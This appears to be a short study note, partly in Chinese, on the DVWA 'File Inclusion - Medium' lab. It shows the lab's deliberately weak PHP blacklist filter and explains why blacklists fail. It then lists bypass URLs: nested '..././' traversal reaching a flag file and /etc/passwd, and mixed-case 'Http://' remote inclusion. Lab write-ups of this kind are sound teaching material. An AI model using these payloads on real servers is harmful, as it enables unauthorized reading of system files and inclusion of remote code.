# File Inclusion - Medium

## View Source

```PHP
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 
```

- [`str_replace($a, $b, $c)`](https://www.php.net/manual/zh/function.str-replace.php)
    - 回傳將 c 的 a 全部替換成 b 後的字串

## Code Review

- 黑名單過濾了幾個關鍵字 (區分大小寫)

## Answer

- 論為什麼黑名單不好

### Example

```
http://127.0.0.1/vulnerabilities/fi/?page=..././..././hackable/flags/fi.php
http://127.0.0.1/vulnerabilities/fi/?page=..././..././..././..././..././etc/passwd
http://127.0.0.1/vulnerabilities/fi/?page=/etc/passwd
http://127.0.0.1/vulnerabilities/fi/?page=Http://www.google.com
http://127.0.0.1/vulnerabilities/fi/?page=hTtp://www.google.com
```